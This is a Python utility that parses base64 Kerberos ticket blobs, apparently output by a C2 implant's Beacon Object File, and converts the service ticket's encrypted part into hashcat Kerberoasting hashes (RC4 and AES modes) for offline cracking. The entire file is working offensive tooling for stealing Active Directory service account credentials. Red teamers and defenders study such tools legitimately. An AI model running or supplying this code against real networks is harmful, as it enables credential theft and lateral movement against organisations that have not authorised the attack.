import sys
import base64
from pyasn1.codec.ber import decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import Ticket, AP_REQ

def convert_bof_to_hashcat(b64_string):
    try:
        # 1. Decode the raw Base64
        data = base64.b64decode(b64_string)
        
        # 2. Find the Ticket start
        # GSS-API wraps can be messy. We look for the Ticket Tag (0x61) 
        # or AP-REQ Tag (0x6e) which is universal in these BOF outputs.
        ticket_data = None
        for i in range(len(data)):
            # 0x61 = Ticket, 0x6e = AP-REQ
            if data[i] in [0x61, 0x6e]:
                try:
                    # Try to parse as Ticket
                    if data[i] == 0x61:
                        ticket = decoder.decode(data[i:], asn1Spec=Ticket())[0]
                    else:
                        # Try to parse as AP-REQ and extract the ticket
                        ap_req = decoder.decode(data[i:], asn1Spec=AP_REQ())[0]
                        ticket = ap_req['ticket']
                    ticket_data = ticket
                    break
                except:
                    continue
        
        if not ticket_data:
            return "[-] Error: Could not find a valid Kerberos Ticket structure in the blob."

        # 3. Extract fields
        realm = ticket_data['realm']._value
        if isinstance(realm, bytes): realm = realm.decode()

        sname_parts = []
        for part in ticket_data['sname']['name-string']:
            val = part._value
            if isinstance(val, bytes): val = val.decode()
            sname_parts.append(val)
        sname = "/".join(sname_parts)

        etype = int(ticket_data['enc-part']['etype'])
        cipher = ticket_data['enc-part']['cipher']._value

        # 4. Format for Hashcat
        # AES check (17, 18) uses trailing 12-byte checksum
        # RC4 check (23) uses leading 16-byte checksum
        if etype == constants.EncryptionTypes.rc4_hmac.value:
            checksum = cipher[:16].hex()
            ciphertext = cipher[16:].hex()
            hashcat_hash = f"$krb5tgs$23$*USER${realm}${sname}*${checksum}${ciphertext}"
            mode = "13100"
        elif etype in [constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, 
                       constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value]:
            # AES Hashcat format: $krb5tgs$etype$user$realm$*spn*$checksum$ciphertext
            # Checksum is the last 12 bytes
            checksum = cipher[-12:].hex()
            ciphertext = cipher[:-12].hex()
            mode = "19600" if etype == 17 else "19700"
            hashcat_hash = f"$krb5tgs${etype}$USER${realm}$*{sname}*${checksum}${ciphertext}"
        else:
            return f"[-] Error: Unsupported encryption type {etype}"

        return f"\n[+] Success! Parsed etype {etype}\n[+] Hashcat Mode: {mode}\n[+] Hash:\n{hashcat_hash}"

    except Exception as e:
        return f"[-] Logic Error: {str(e)}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 bof_to_hashcat.py <RAW_BASE64_STRING>")
        sys.exit(-1)

    b64_input = sys.argv[1].replace("\n", "").replace("\r", "").strip()
    print(convert_bof_to_hashcat(b64_input))
